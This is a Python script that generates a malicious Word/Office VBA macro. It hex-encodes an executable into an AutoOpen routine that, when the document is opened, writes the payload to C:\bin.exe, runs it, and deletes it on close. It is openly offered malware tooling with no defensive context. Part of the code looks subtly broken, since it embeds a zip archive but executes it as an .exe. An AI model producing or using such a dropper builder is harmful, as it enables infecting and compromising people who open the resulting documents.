import zipfile
from binascii import hexlify
from zipfile import ZipFile

file_head = f'''
Sub AutoOpen()
    Dim fileName As String
    fileName = "C:\\bin.exe"
    Dim coll As Object
    Set coll = CreateObject("System.Collections.ArrayList")
'''

end_of_file = f'''
    Dim toFile
    Dim MyChar
    Open fileName For Output As #1
        For Each elem In coll
            arr = Split(elem, "|")
            For Each hexStr In arr
               toFile = toFile + HexToString(CStr(hexStr))
            Next
        Next
        Print #1, toFile
    Close #1
    Call Shell(fileName, vbNormalFocus)
End Sub

Sub DeleteFile(ByVal FileToDelete As String)
   If (Dir(FileToDelete) <> "") Then
      SetAttr FileToDelete, vbNormal
      Kill FileToDelete
   End If
End Sub


Private Function HexToString(Value As String)
    Dim szTemp As String
    szTemp = Value

    Dim szData As String
    szData = ""
    While Len(szTemp) > 0
        szData = Chr(CLng("&h" & Right(szTemp, 2))) & szData
        If (Len(szTemp) = 1) Then
            szTemp = Left(szTemp, Len(szTemp) - 1)
        Else
            szTemp = Left(szTemp, Len(szTemp) - 2)
        End If
    Wend
    HexToString = szData
End Function

Sub AutoClose()
    DeleteFile ("C:\\bin.exe")
End Sub
'''


def file2hex(input_file, output_file):
    # Create a ZipFile Object
    zip_file = 'zip/temp.zip'

    with ZipFile(zip_file, 'w',  zipfile.ZIP_DEFLATED) as zipObj2:
        zipObj2.write(input_file)

    with open(zip_file, "rb") as fd_in, open(output_file, "w") as fd_out:
        fd_out.write(file_head)
        count_str = 0
        count_hex = 0
        while chunk := fd_in.read(128):
            count_str = count_str + 1
            split_strings = [hexlify(chunk)[i:i + 2] for i in range(0, len(hexlify(chunk)), 2)]
            _string = f''' "'''
            for hex_var in split_strings:
                count_hex = count_hex + 1
                _string = _string + str(hex_var)[2:][:-1] + '|'
            print("String N_" + str(count_str))
            _string = _string + '" & _ \n'
            _string = _string[:-1] + '"\n'
            _string = '\tcoll.Add ' + _string
            print(_string)
            fd_out.write(_string)
        fd_out.write(end_of_file)


if __name__ == '__main__':
    file2hex(f"""exe/bin.exe.exe""", f"""hex/m.VBA""")
